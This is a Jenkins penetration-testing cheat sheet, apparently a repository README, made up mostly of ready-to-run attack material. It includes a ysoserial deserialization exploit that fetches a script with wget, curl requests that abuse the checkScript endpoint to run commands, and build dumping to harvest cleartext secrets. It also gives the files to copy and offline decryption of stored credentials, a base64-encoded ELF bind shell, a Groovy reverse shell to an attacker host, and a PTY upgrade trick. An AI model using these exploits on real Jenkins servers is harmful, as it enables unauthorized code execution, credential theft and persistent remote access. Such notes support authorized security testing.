Jenkins Pentesting Notes
========================

Notes about Jenkins exploitation and post-exploitation.


Remote Code Execution
=====================
Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
---------------------------------------------------------------------------
Use [ysoserial](https://github.com/frohoff/ysoserial) to generate a payload.
Then RCE using [this script](./rce/pwn_jenkins.py):

```bash
java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.sh' > payload.out
./jenkins_rce.py jenkins_ip jenkins_port payload.out
```


Metaprogramming RCE in Jenkins Plugins (CVE-2019-100300{0,1,2})
---------------------------------------------------------------
[Jenkins Advisory](https://jenkins.io/security/advisory/2019-01-08)

Original pre-auth RCE vulnerability [here](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html).

Alternative RCE with Overall/Read and Job/Configure permissions [here](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc).


CheckScript RCE in Jenkins (CVE-2019-10030{29,30})
--------------------------------------------------
[Jenkins Advisory](https://jenkins.io/security/advisory/2019-03-06/), [Credits](https://twitter.com/webpentest).

Check if a Jenkins instance is vulnerable (needs Overall/Read permissions) with some Groovy:
```bash
curl -k -4 -X POST "https://whatever.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'
```

Execute arbitraty bash commands:
```bash
curl -k -4 -X POST "https://whatever.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt"}}'
```

Alternative RCE/DACL bypass payload [here](https://gist.github.com/akhil-reni/e2116cc243af096ca3416168f49b3298) though be advised that this one will absolutely trash the whole security configuration!


Dumping builds to find cleartext secrets
========================================
Use [this script](./dump_builds/jenkins_dump_builds.py) to dump build console outputs and build environment variables to hopefully find cleartext secrets.

```
usage: jenkins_dump_builds.py [-h] [-u USER] [-p PASSWORD] [-o OUTPUT_DIR]
                              [-d] [-l] [-r]
                              url [url ...]

Dump all available info from Jenkins

positional arguments:
  url

optional arguments:
  -h, --help            show this help message and exit
  -u USER, --user USER
  -p PASSWORD, --password PASSWORD
  -o OUTPUT_DIR, --output-dir OUTPUT_DIR
  -d, --downgrade_ssl   Downgrade SSL to use RSA
  -l, --last            Dump only the last build of each job
  -r, --recover_from_failure
                        Recover from server failure, skip all existing
                        directories
```

Files to copy after compromission
=================================

These files are needed to decrypt Jenkins secrets:

* secrets/master.key
* secrets/hudson.util.Secret

Such secrets can usually be found in:

* credentials.xml
* jobs/.../build.xml

Here's a regexp to find them:
```bash
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
```


Decrypt Jenkins secrets offline
===============================

Use [this script](./offline_decryption/jenkins_offline_decrypt.py) to decrypt previsously dumped secrets.

```
Usage:
	jenkins_offline_decrypt.py <jenkins_base_path>
or:
	jenkins_offline_decrypt.py <master.key> <hudson.util.Secret> [credentials.xml]
or:
    jenkins_offline_decrypt.py -i <path> (interactive mode)
```


Groovy Scripts
==============
Decrypt Jenkins secrets from Groovy
-----------------------------------

```java
println(hudson.util.Secret.decrypt("{...}"))
```


Command execution from Groovy
-----------------------------

```java
def proc = "id".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```

For multiline shell commands, use the following shell syntax trick (example includes bind shell):

```java
def proc="sh -c \$@|sh . echo /bin/echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgD96UiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU= | base64 -d > /tmp/65001".execute();
```


Reverse shell from Groovy
-------------------------

```java
String host="myip";
int port=1234;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

I'll leave this reverse shell tip to recover a fully working PTY here in case anyone needs it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
^Z bg
stty -a
echo $TERM
stty raw -echo
fg
export TERM=...
stty rows xx columns yy
```
